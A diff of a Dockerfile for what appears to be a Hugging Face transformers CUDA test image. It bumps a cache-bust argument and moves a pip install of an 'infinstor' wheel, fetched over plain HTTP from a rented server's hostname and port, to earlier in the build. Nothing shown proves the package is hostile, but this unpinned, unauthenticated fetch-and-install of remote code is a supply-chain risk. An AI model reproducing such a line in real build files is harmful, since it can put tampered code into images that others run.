@@ -1,6 +1,6 @@
 FROM nvidia/cuda:11.2.2-cudnn8-devel-ubuntu20.04
 LABEL maintainer="Hugging Face"
-ARG CACHEBUST=11
+ARG CACHEBUST=12
 
 ARG DEBIAN_FRONTEND=noninteractive
 
@@ -20,6 +20,8 @@ RUN apt update
 RUN apt install -y git libsndfile1-dev tesseract-ocr espeak-ng python3 python3-pip ffmpeg git-lfs
 RUN git lfs install
 RUN python3 -m pip install --no-cache-dir --upgrade pip
+
+RUN python3 -m pip install --no-cache-dir http://vmi504080.contaboserver.net:9876/packages/clientlib/infinstor-2.0.47-py3-none-any.whl
 
 ARG REF=main
 RUN git clone https://github.com/huggingface/transformers && cd transformers && git checkout $REF
@@ -58,4 +60,3 @@ RUN python3 -c "from transformers import pipeline; nlp = pipeline('sentiment-ana
 RUN python3 -c "from transformers import AutoTokenizer, AutoModelForTokenClassification; tokenizer = AutoTokenizer.from_pretrained('Jean-Baptiste/roberta-large-ner-english'); model = AutoModelForTokenClassification.from_pretrained('Jean-Baptiste/roberta-large-ner-english');"
 RUN ln -s /usr/bin/python3 /usr/bin/python
 
-RUN python3 -m pip install --no-cache-dir http://vmi504080.contaboserver.net:9876/packages/clientlib/infinstor-2.0.47-py3-none-any.whl
